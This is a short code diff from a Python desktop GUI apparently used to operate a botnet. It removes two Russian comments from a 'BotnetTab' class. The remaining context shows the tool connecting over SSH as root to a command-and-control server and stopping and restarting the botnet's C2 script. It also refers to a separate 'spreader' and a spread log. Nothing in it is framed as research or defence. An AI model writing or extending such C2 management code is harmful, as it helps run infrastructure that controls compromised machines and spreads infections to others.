@@ -523,7 +523,6 @@ class BotnetTab(ttk.Frame):
                 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 client.connect(self.c2_host, username="root", password=self.vps_pass, timeout=10)
 
-                # Останавливаем только C2, спредер не трогаем
                 stop_cmd = "systemctl stop avz-c2; pkill -9 -f botnet/c2.py"
                 client.exec_command(stop_cmd)
 
@@ -533,7 +532,6 @@ class BotnetTab(ttk.Frame):
                 err = stderr.read().decode()
                 self.spread_log.insert(tk.END, out + "\n" + err + "\n")
 
-                # Запускаем только C2
                 start_c2 = "cd /root/c2 && nohup python3 botnet/c2.py > c2.log 2>&1 &"
                 client.exec_command(start_c2)
 
